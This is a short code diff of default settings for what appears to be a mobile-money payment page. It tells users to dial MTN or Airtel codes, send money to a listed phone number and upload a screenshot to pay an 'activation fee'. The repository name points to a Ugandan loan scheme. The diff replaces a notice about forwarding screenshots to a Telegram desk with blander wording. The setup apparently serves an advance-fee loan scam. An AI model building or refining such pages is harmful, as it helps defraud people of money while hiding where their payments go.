@@ -23,7 +23,7 @@ export const defaultSettings: AppSettings = {
   step1: rawSettings.step1 || 'Dial *165*1*2# (MTN) or *185# (Airtel).',
   step2: rawSettings.step2 || "Enter recipient's number 254780571549 and amount.",
   step3: rawSettings.step3 || 'Take a screenshot of the confirmation SMS and upload it below.',
-  noticeText: rawSettings.noticeText || 'Payment screenshot is verified and forwarded to our Telegram desk',
+  noticeText: rawSettings.noticeText || 'Verifying activation fee',
   githubToken: (rawSettings as any).githubToken || '',
   githubRepo: (rawSettings as any).githubRepo || 'supportmomoloans-glitch/Activation-fee-Uganda-mosticah',
 };
